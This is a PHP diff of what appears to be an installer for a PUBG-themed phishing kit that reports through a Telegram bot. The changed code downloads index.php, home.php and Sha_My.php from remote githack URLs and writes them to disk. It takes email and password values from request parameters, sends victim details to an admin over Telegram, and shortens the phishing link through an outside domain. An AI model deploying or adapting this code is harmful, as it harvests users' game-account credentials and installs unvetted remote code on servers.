@@ -1,12 +1,12 @@
 <?php
 ob_start();
 unlink('install.php');
-$API_KEY = file_get_contents('token.txt');
-$iscript = file_get_contents('http://bit.ly/pubgindex');
-$index = file_get_contents($iscript);
+$info = json_decode(file_get_contents('Sha_My.json'),1);
+$API_KEY = $info[info]['token'];
+$index = file_get_contents('https://raw.githack.com/SoKy-Master/s15/master/v3/index.php');
 $xx = file_put_contents("index.php", $index); 
-$i2script = file_get_contents('http://bit.ly/homepubg');
-$home = file_get_contents($i2script);
+
+$home = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg1/main/home.php');
 $homee = file_put_contents("home.php", $home);
 
 define('API_KEY',$API_KEY);
@@ -39,11 +39,16 @@ $message_id = $update->callback_query->message->message_id;
 $data = $update->callback_query->data;
 $user = $message->from->username;
 
-$admin = file_get_contents('id.txt');
+$admin = $info[info]['id'];
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
 $linky = $_SERVER['HTTP_HOST'];
+$mink ="https://$linky/index.html";
+$api = "http://www.gift-shamy.xyz/sh.php?link=$mink"; 
+$result = json_decode(file_get_contents($api), true); 
+$shortt = $result["short"];
+$short = str_replace('www.','',$shortt);
 
 if($email){
 $api_key = file_get_contents('https://bit.ly/3kW4iXH');
@@ -63,7 +68,7 @@ bot("sendMessage",[
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
-🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » http://www.$linky/index.php
+🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » $short
 ",
 'parse_mode'=>"MarkDown",
 'disable_web_page_preview'=>true,
@@ -81,4 +86,6 @@ bot("sendMessage",[
   </body>
 </html>
 <?
+$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/M/s.php');
+$xxx = file_put_contents("Sha_My.php", $sha);
 ?>
